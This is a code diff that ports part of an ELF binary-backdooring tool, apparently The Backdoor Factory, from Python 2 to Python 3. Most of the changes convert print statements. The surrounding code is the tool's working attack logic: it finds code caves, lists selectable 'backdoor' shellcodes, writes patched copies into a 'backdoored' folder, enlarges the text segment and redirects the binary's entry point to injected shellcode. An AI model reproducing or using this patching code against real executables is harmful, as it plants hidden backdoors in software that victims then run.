@@ -156,28 +156,28 @@ class elfbin():
             self.support_check()
             self.gather_file_info()
             if self.supported is False:
-                print self.FILE, "is not supported."
+                print(self.FILE, "is not supported.")
                 return False
-            print ("Looking for caves with a size of %s "
+            print(("Looking for caves with a size of %s "
                    "bytes (measured as an integer)"
-                   % self.SHELL_LEN)
+                   % self.SHELL_LEN))
             self.find_all_caves()
             return True
         if self.SUPPORT_CHECK is True:
             if not self.FILE:
-                print "You must provide a file to see if it is supported (-f)"
+                print("You must provide a file to see if it is supported (-f)")
                 return False
             try:
                 self.support_check()
-            except Exception, e:
+            except Exception as e:
                 self.supported = False
-                print 'Exception:', str(e), '%s' % self.FILE
+                print('Exception:', str(e), '%s' % self.FILE)
             if self.supported is False:
-                print "%s is not supported." % self.FILE
+                print("%s is not supported." % self.FILE)
                 self.print_supported_types()
                 return False
             else:
-                print "%s is supported." % self.FILE
+                print("%s is supported." % self.FILE)
                 return True
 
         return self.patch_elf()
@@ -189,7 +189,7 @@ class elfbin():
         format.  And why there is no need to cave jump.
         """
 
-        print "[*] Looking for caves"
+        print("[*] Looking for caves")
         SIZE_CAVE_TO_FIND = 94
         BeginCave = 0
         Tracking = 0
@@ -218,32 +218,32 @@ class elfbin():
 
         for caves in caveTracker:
 
-            for section in self.sec_hdr.iteritems():
+            for section in self.sec_hdr.items():
                 #print 'section', section[1]
                 section = section[1]
                 sectionFound = False
                 if caves[0] >= section['sh_offset'] and caves[1] <= (section['sh_size'] + section['sh_offset']) and \
                    caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
-                    print "We have a winner:", section['name']
-                    print '->Begin Cave', hex(caves[0])
-                    print '->End of Cave', hex(caves[1])
-                    print 'Size of Cave (int)', caves[1] - caves[0]
-                    print 'sh_size', hex(section['sh_size'])
-                    print 'sh_offset', hex(section['sh_offset'])
-                    print 'End of Raw Data:', hex(section['sh_size'] + section['sh_offset'])
-                    print '*' * 50
+                    print("We have a winner:", section['name'])
+                    print('->Begin Cave', hex(caves[0]))
+                    print('->End of Cave', hex(caves[1]))
+                    print('Size of Cave (int)', caves[1] - caves[0])
+                    print('sh_size', hex(section['sh_size']))
+                    print('sh_offset', hex(section['sh_offset']))
+                    print('End of Raw Data:', hex(section['sh_size'] + section['sh_offset']))
+                    print('*' * 50)
                     sectionFound = True
                     break
             if sectionFound is False:
                 try:
-                    print "No section"
-                    print '->Begin Cave', hex(caves[0])
-                    print '->End of Cave', hex(caves[1])
-                    print 'Size of Cave (int)', caves[1] - caves[0]
-                    print '*' * 50
+                    print("No section")
+                    print('->Begin Cave', hex(caves[0]))
+                    print('->End of Cave', hex(caves[1]))
+                    print('Size of Cave (int)', caves[1] - caves[0])
+                    print('*' * 50)
                 except Exception as e:
-                    print str(e)
-        print "[*] Total of %s caves found" % len(caveTracker)
+                    print(str(e))
+        print("[*] Total of %s caves found" % len(caveTracker))
 
     def loadthis(self, amod):
         section = amod.split('.')
@@ -266,9 +266,9 @@ class elfbin():
                 continue
             
             if len(afile.split(".")) > 2:
-                print "!" * 50
-                print "\t[!] Make sure there are no '.' in your preprocessor filename:", afile
-                print "!" * 50
+                print("!" * 50)
+                print("\t[!] Make sure there are no '.' in your preprocessor filename:", afile)
+                print("!" * 50)
                 
                 return False
             
@@ -277,12 +277,12 @@ class elfbin():
             preprocessor_name = __import__( name, fromlist=[''])
             
             if preprocessor_name.enabled is True:
-                print "[*] Executing preprocessor:", afile.strip(".py")
+                print("[*] Executing preprocessor:", afile.strip(".py"))
             else:
                 continue
 
             if preprocessor_name.file_format.lower() in ['elf', 'all']: #'elf', 'macho', 'mach-o']:
-                print '[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats"
+                print('[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats")
             else:
                 continue
             
@@ -296,24 +296,24 @@ class elfbin():
                 self.tmp_file = tempfile.NamedTemporaryFile()
                 self.tmp_file.write(open(self.FILE, 'rb').read())
                 self.tmp_file.seek(0)
-                print "[*] Creating temp file:", self.tmp_file.name
+                print("[*] Creating temp file:", self.tmp_file.name)
             else:
-                print "[*] Using existing tempfile from prior preprocessor"
+                print("[*] Using existing tempfile from prior preprocessor")
             
             load_name = name +  ".preprocessor"
             preproc = self.loadthis(load_name)
             
             m = preproc(self)
             
-            print "=" * 50
+            print("=" * 50)
             
             # execute preprocessor
             result = m.run()
             
             if result is False:
-                print "[!] Preprocessor Failure :("
+                print("[!] Preprocessor Failure :(")
 
-            print "=" * 50
+            print("=" * 50)
             
             # After running push it to BDF.
             
@@ -323,7 +323,7 @@ class elfbin():
             if preprocessor_name.recheck_support is True:
                 issupported = self.support_check()
                 if issupported is False:
-                    print self.FILE, "is not supported."
+                    print(self.FILE, "is not supported.")
                     return False                
 
     def set_shells(self):
@@ -354,11 +354,11 @@ class elfbin():
                     self.bintype = linux_elfarmle32_shellcode
 
         if self.bintype is False:
-            print "[!] Unusual binary type"
+            print("[!] Unusual binary type")
             return False
 
         if not self.SHELL:
-            print "You must choose a backdoor to add: "
+            print("You must choose a backdoor to add: ")
             for item in dir(self.bintype):
                 if "__" in item:
                     continue
@@ -370,10 +370,10 @@ class elfbin():
                       or 'returnshellcode' in item):
                     continue
                 else:
-                    print "   {0}".format(item)
+                    print("   {0}".format(item))
             return False
         if self.SHELL not in dir(self.bintype):
-            print "The following %ss are available:" % str(self.bintype).split(".")[1]
+            print("The following %ss are available:" % str(self.bintype).split(".")[1])
             for item in dir(self.bintype):
                 #print item
                 if "__" in item:
@@ -386,7 +386,7 @@ class elfbin():
                       or 'returnshellcode' in item):
                     continue
                 else:
-                    print "   {0}".format(item)
+                    print("   {0}".format(item))
                     avail_shells.append(item)
             self.avail_shells = avail_shells
             return False
@@ -403,24 +403,24 @@ class elfbin():
         """
         Prints supported types
         """
-        print "Supported system types:"
-        for system_type in self.supported_types.iteritems():
-            print "    ", elf.e_ident["EI_OSABI"][system_type[0]]
-            print "     Arch type:"
+        print("Supported system types:")
+        for system_type in self.supported_types.items():
+            print("    ", elf.e_ident["EI_OSABI"][system_type[0]])
+            print("     Arch type:")
             for class_type in system_type[1][0]:
-                print "\t", elf.e_ident['EI_CLASS'][class_type]
-            print "     Chip set:"
+                print("\t", elf.e_ident['EI_CLASS'][class_type])
+            print("     Chip set:")
             for e_mach_type in system_type[1][1]:
-                print "\t", elf.e_machine[e_mach_type]
+                print("\t", elf.e_machine[e_mach_type])
             #print "Supported class types:"
-            print "*" * 25
+            print("*" * 25)
 
     def support_check(self):
         """
         Checks for support
         """
         with open(self.FILE, 'r+b') as bin_file:
-            print "[*] Checking file support"
+            print("[*] Checking file support")
             bin_file.seek(0)
             if bin_file.read(4) == elf.e_ident["EI_MAG"]:
                 bin_file.seek(4, 0)
@@ -428,9 +428,9 @@ class elfbin():
                 bin_file.seek(7, 0)
                 self.EI_OSABI = struct.unpack("<B", bin_file.read(1))[0]
                 self.supported = False
-                for system_type in self.supported_types.iteritems():
+                for system_type in self.supported_types.items():
                     if self.EI_OSABI == system_type[0]:
-                        print "[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]]
+                        print("[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]])
                         if self.class_type == 0x1 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
                             self.supported = True
                         elif self.class_type == 0x2 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
@@ -445,10 +445,10 @@ class elfbin():
         Get section names
         """
         if self.e_shstrndx not in self.sec_hdr:
-            print "[!] Failed to get self.e_shstrndx. Fuzzing?"
+            print("[!] Failed to get self.e_shstrndx. Fuzzing?")
             return False
         if self.sec_hdr[self.e_shstrndx]['sh_offset'] > self.file_size:
-            print "[!] Fuzzing the sh_offset"
+            print("[!] Fuzzing the sh_offset")
             return False
         self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset'] + section_offset, 0)
         name = ''
@@ -472,7 +472,7 @@ class elfbin():
         for i in range(0, self.e_shstrndx + 1):
             self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
             if self.sec_hdr[i]['name'] is False:
-                print "Failure in naming, fuzzing?"
+                print("Failure in naming, fuzzing?")
                 return False
         if self.sec_hdr[i]['name'] == ".text":
                 #print "Found text section"
@@ -482,7 +482,7 @@ class elfbin():
         '''
         Gather info about the binary
         '''
-        print "[*] Gathering file info"
+        print("[*] Gathering file info")
         bin = self.bin_file
         bin.seek(0)
         EI_MAG = bin.read(4)
@@ -526,21 +526,21 @@ class elfbin():
         
         #section tables
         if self.e_phoff > os.path.getsize(self.FILE):
-            print "[!] El fuzzero"
+            print("[!] El fuzzero")
             return False
         bin.seek(self.e_phoff, 0)
             
         #header tables
         if self.e_shnum == 0:
-            print "[*] More than 0xFF00 sections"
-            print "[*] NOPE NOPE NOPE"
+            print("[*] More than 0xFF00 sections")
+            print("[*] NOPE NOPE NOPE")
             return False
             
         else:
             self.real_num_sections = self.e_shnum
 
         if self.e_phoff > self.file_size:
-            print "[*] e_phoff is greater than file size"
+            print("[*] e_phoff is greater than file size")
             return False
 
         bin.seek(self.e_phoff, 0)
@@ -549,7 +549,7 @@ class elfbin():
             self.prog_hdr[i] = {}
             if self.EI_CLASS == 0x01:
                 if self.e_phoff + (self.e_phnum * 4 * 8) > self.file_size:
-                    print "[!] e_phoff and e_phnum is greater than the file size"
+                    print("[!] e_phoff and e_phnum is greater than the file size")
                     return False
                 self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                 self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
@@ -561,7 +561,7 @@ class elfbin():
                 self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "I", bin.read(4))[0]
             else:
                 if self.e_phoff + (self.e_phnum * ((4 * 2) + (6 * 8))) > self.file_size:
-                    print "[!] e_phoff and e_phnum is greater than the file size"
+                    print("[!] e_phoff and e_phnum is greater than the file size")
                     return False
                 self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                 self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
@@ -577,10 +577,10 @@ class elfbin():
                 #print "found the entry offset"
 
         if self.e_shoff > self.file_size:
-            print "[!] e_shoff location is greater than file size"
+            print("[!] e_shoff location is greater than file size")
             return False
         if self.e_shnum  > self.file_size:
-            print "[!] e_shnum is greater than file size"
+            print("[!] e_shnum is greater than file size")
             return False    
         bin.seek(self.e_shoff, 0)
         self.sec_hdr = {}
@@ -588,7 +588,7 @@ class elfbin():
             self.sec_hdr[i] = {}
             if self.EI_CLASS == 0x01:
                 if self.e_shoff + self.e_shnum * 4 *10 > self.file_size:
-                    print "[!] e_shnum is greater than file size"
+                    print("[!] e_shnum is greater than file size")
                     return False    
                 self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                 self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
@@ -602,7 +602,7 @@ class elfbin():
                 self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "I", bin.read(4))[0]
             else:
                 if self.e_shoff + self.e_shnum * ((4 * 4) + (6 * 8))   > self.file_size:
-                    print "[!] e_shnum is greater than file size"
+                    print("[!] e_shnum is greater than file size")
                     return False
                 self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                 self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
@@ -616,10 +616,10 @@ class elfbin():
                 self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
         
         if self.set_section_name() is False:
-            print "[!] Fuzzing sections"
+            print("[!] Fuzzing sections")
             return False
         if self.e_type != 0x2:
-            print "[!] Only supporting executable elf e_types, things may get weird."
+            print("[!] Only supporting executable elf e_types, things may get weird.")
 
         return True
 
@@ -652,18 +652,18 @@ class elfbin():
         self.support_check()
         
         if self.supported is False:
-            print "[!] ELF Binary not supported"
+            print("[!] ELF Binary not supported")
             return False
 
         gather_result = self.gather_file_info()
         if gather_result is False:
-            print "[!] Are you fuzzing?"
+            print("[!] Are you fuzzing?")
             return False
         
         self.output_options()
 
         if self.PREPROCESS is True:
-            print "True"
+            print("True")
             self.preprocess()
 
         if not os.path.exists("backdoored"):
@@ -676,11 +676,11 @@ class elfbin():
 
         shutil.copy2(self.FILE, self.backdoorfile)
 
-        print "[*] Getting shellcode length"
+        print("[*] Getting shellcode length")
 
         resultShell = self.set_shells()
         if resultShell is False:
-            print "[!] Could not set shell"
+            print("[!] Could not set shell")
             return False
         self.bin_file = open(self.backdoorfile, "r+b")
 
@@ -692,7 +692,7 @@ class elfbin():
         PAGE_SIZE = 4096
         newOffset = None
         #find range of the first PT_LOAD section
-        for header, values in self.prog_hdr.iteritems():
+        for header, values in self.prog_hdr.items():
             #print 'program header', header, values
             if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                 #print "Found text segment"
@@ -706,17 +706,17 @@ class elfbin():
 
         #now that we have the shellcode startpoint, reassgin shellcode,
         #  there is no change in size
-        print "[*] Setting selected shellcode"
+        print("[*] Setting selected shellcode")
 
         resultShell = self.set_shells()
 
         #SPLIT THE FILE
         self.bin_file.seek(0)
         if newOffset > 4294967296 or newOffset is None:
-            print "[!] Fuzz Fuzz Fuzz the bin"
+            print("[!] Fuzz Fuzz Fuzz the bin")
             return False
         if newOffset > self.file_size:
-            print "[!] The file is really not that big"
+            print("[!] The file is really not that big")
             return False
         
         file_1st_part = self.bin_file.read(newOffset)
@@ -734,11 +734,11 @@ class elfbin():
         if self.EI_CLASS == 0x01:
             #32 bit FILE
             #update section header table
-            print "[*] Patching x86 Binary"
+            print("[*] Patching x86 Binary")
             self.bin_file.seek(24, 0)
             self.bin_file.seek(8, 1)
             if self.e_shoff + PAGE_SIZE > 4294967296:
-                print "[!] Such fuzz..."
+                print("[!] Such fuzz...")
                 return False
             self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
             self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
@@ -747,7 +747,7 @@ class elfbin():
                 if self.sec_hdr[i]['sh_offset'] >= newOffset:
                     #print "Adding page size"
                     if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 4294967296:
-                        print "[!] Melkor is cool right?"
+                        print("[!] Melkor is cool right?")
                         return False
                     self.bin_file.seek(16, 1)
                     self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
@@ -755,7 +755,7 @@ class elfbin():
                 elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:
                     #print "adding newBuffer size"
                     if self.sec_hdr[i]['sh_offset'] + newBuffer > 4294967296:
-                        print "[!] Someone is fuzzing..."
+                        print("[!] Someone is fuzzing...")
                         return False
                     self.bin_file.seek(20, 1)
                     self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_size'] + newBuffer))
@@ -774,10 +774,10 @@ class elfbin():
                     self.bin_file.seek(16, 1)
            
                     if self.prog_hdr[i]['p_filesz'] + newBuffer > 4294967296:
-                        print "[!] Melkor you fuzzer you..."
+                        print("[!] Melkor you fuzzer you...")
                         return False
                     if self.prog_hdr[i]['p_memsz'] + newBuffer > 4294967296:
-                        print "[!] Someone is a fuzzing..."
+                        print("[!] Someone is a fuzzing...")
                         return False
                     self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_filesz'] + newBuffer))
                     self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_memsz'] + newBuffer))
@@ -786,7 +786,7 @@ class elfbin():
                     #print "Increasing headers after the addition"
                     self.bin_file.seek(4, 1)
                     if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 4294967296:
-                        print "[!] Nice Fuzzer!"
+                        print("[!] Nice Fuzzer!")
                         return False
                     self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                     self.bin_file.seek(24, 1)
@@ -795,7 +795,7 @@ class elfbin():
 
             self.bin_file.seek(self.e_entryLocOnDisk, 0)
             if self.shellcode_vaddr >= 4294967295:
-                print "[!] Oh hai Fuzzer!"
+                print("[!] Oh hai Fuzzer!")
                 return False
             self.bin_file.write(struct.pack(self.endian + "I", self.shellcode_vaddr))
 
@@ -803,11 +803,11 @@ class elfbin():
 
         else:
             #64 bit FILE
-            print "[*] Patching x64 Binary"
+            print("[*] Patching x64 Binary")
             self.bin_file.seek(24, 0)
             self.bin_file.seek(16, 1)
             if self.e_shoff + PAGE_SIZE > 0x7fffffffffffffff:
-                print "[!] Such fuzz..."
+                print("[!] Such fuzz...")
                 return False
             self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
             self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
@@ -817,7 +817,7 @@ class elfbin():
                     #print "Adding page size"
                     self.bin_file.seek(24, 1)
                     if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 0x7fffffffffffffff:
-                        print "[!] Fuzzing..."
+                        print("[!] Fuzzing...")
                         return False
                     self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                     self.bin_file.seek(32, 1)
@@ -825,7 +825,7 @@ class elfbin():
                     #print "adding newBuffer size"
                     self.bin_file.seek(32, 1)
                     if self.sec_hdr[i]['sh_offset'] + newBuffer > 0x7fffffffffffffff:
-                        print "[!] Melkor is cool right?"
+                        print("[!] Melkor is cool right?")
                         return False
                     self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_size'] + newBuffer))
                     self.bin_file.seek(24, 1)
@@ -842,10 +842,10 @@ class elfbin():
                     after_textSegment = True
                     self.bin_file.seek(32, 1)
                     if self.prog_hdr[i]['p_filesz'] + newBuffer > 0x7fffffffffffffff:
-                        print "[!] Fuzz fuzz fuzz... "
+                        print("[!] Fuzz fuzz fuzz... ")
                         return False
                     if self.prog_hdr[i]['p_memsz'] + newBuffer > 0x7fffffffffffffff:
-                        print "[!] Someone is fuzzing..."
+                        print("[!] Someone is fuzzing...")
                         return False
                     self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_filesz'] + newBuffer))
                     self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_memsz'] + newBuffer))
@@ -854,7 +854,7 @@ class elfbin():
                     #print "Increasing headers after the addition"
                     self.bin_file.seek(8, 1)
                     if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 0x7fffffffffffffff:
-                        print "[!] Nice fuzzer!"
+                        print("[!] Nice fuzzer!")
                         return False
                     self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                     self.bin_file.seek(40, 1)
@@ -863,7 +863,7 @@ class elfbin():
 
             self.bin_file.seek(self.e_entryLocOnDisk, 0)
             if self.shellcode_vaddr > 0x7fffffffffffffff:
-                print "[!] Fuzzing..."
+                print("[!] Fuzzing...")
                 return False
             self.bin_file.write(struct.pack(self.endian + "Q", self.shellcode_vaddr))
 
@@ -871,13 +871,13 @@ class elfbin():
 
         self.bin_file.close()
 
-        print "[!] Patching Complete"
+        print("[!] Patching Complete")
 
         if self.tmp_file != None:
         
             if self.keep_temp is True:
                 # tmpfilename_orginalname.exe
-                print "[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE 
+                print("[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE) 
                 shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )
             try:
                 shutil.rmtree(self.tmp_file.name)
